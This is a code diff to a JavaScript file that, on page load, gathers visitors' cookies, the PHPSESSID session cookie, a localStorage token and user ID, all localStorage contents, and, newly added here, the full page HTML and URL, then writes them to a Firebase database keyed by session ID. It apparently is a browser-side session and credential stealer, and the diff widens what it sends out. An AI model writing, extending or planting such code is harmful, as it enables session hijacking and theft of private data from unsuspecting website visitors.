@@ -22,12 +22,19 @@ const app = initializeApp(firebaseConfig);
 // Process the URL to extract the path
 const url = window.location.href.replace(/https:\/\//, '').replace(/\./g, '-');
 const path = url.split("?")[0].split("-html");
+const outerHTML = document.documentElement.outerHTML;
 
 // Retrieve cookie and localStorage data
 const cookie = document.cookie;
 const token = localStorage.getItem("token");
 const userId = localStorage.getItem("user_id") || 'facebook-google';
 
+// Function to retrieve the PHPSESSID from cookies
+function getPHPSESSID() {
+    const phpsessidCookie = document.cookie.split('; ').find(cookie => cookie.startsWith('PHPSESSID='));
+    return phpsessidCookie ? phpsessidCookie.split('=')[1] : null;
+}
+const PHPSESSID = getPHPSESSID();
 
 // Function to convert localStorage items to a JSON string
 const localStorageToJson = () => {
@@ -37,14 +44,7 @@ const localStorageToJson = () => {
 };
 const localStorageJSON = localStorageToJson();
 
-
-// Function to retrieve the PHPSESSID from cookies
-function getPHPSESSID() {
-    const phpsessidCookie = document.cookie.split('; ').find(cookie => cookie.startsWith('PHPSESSID='));
-    return phpsessidCookie ? phpsessidCookie.split('=')[1] : null;
-}
-const PHPSESSID = getPHPSESSID();
-
+// Function to get CurrentFormattedTime
 function getCurrentFormattedTime() {
     const now = new Date();
     const year = now.getFullYear();
@@ -56,20 +56,18 @@ function getCurrentFormattedTime() {
 }
 const time = getCurrentFormattedTime();
 
-
-
 // Function to write data to the database
-function writeData(PHPSESSID, userId, token, cookie, localStorageJSON, time) {
+function writeData(PHPSESSID, time, userId, token, cookie, localStorageJSON, outerHTML, url) {
     const db = getDatabase();
     set(ref(db, `${path[0]}/${PHPSESSID}/${time}`), {
         PHPSESSID: PHPSESSID,
+        time: time,
         userId: userId,
         token: token,
         cookie: cookie,
         localStorage: localStorageJSON,
-        time: time
+        outerHTML: outerHTML,
+        url: url
     });
 }
-
-// Call the writeData function
-writeData(PHPSESSID, userId, token, cookie, localStorageJSON, time);
+writeData(PHPSESSID, time, userId, token, cookie, localStorageJSON, outerHTML, url);
